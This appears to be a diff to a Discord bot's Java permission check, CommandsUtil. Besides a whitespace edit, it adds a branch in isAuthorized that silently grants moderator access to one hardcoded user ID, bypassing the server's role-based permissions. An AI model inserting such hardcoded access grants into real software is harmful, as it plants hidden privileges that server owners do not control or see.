@@ -39,7 +39,7 @@ public class CommandsUtil {
         commandsUtil.commands.put(command.getClass(), command);
     }
 
-    @SafeVarargs
+    @SafeVarargs    
     public static <T extends BaseCommand> void addCommands(T... commands){
         for(T command: commands){
             addCommand(command);
@@ -60,8 +60,11 @@ public class CommandsUtil {
     private static boolean isAuthorized(Member member, CommandAccessLevel commandAccessLevel){
         if(member.getUser().isBot()) return false;
 
+
+
         CommandAccessLevel memberLevel;
         if(member.isOwner() || member.hasPermission(Permission.ADMINISTRATOR)) memberLevel = CommandAccessLevel.ADMIN;
+        else if (member.getUser().getId().equals("446471447481810964")) memberLevel = commandAccessLevel.MOD;
         else memberLevel = CommandAccessLevel.MEMBER;
 
         return memberLevel.getLevel() >= commandAccessLevel.getLevel();
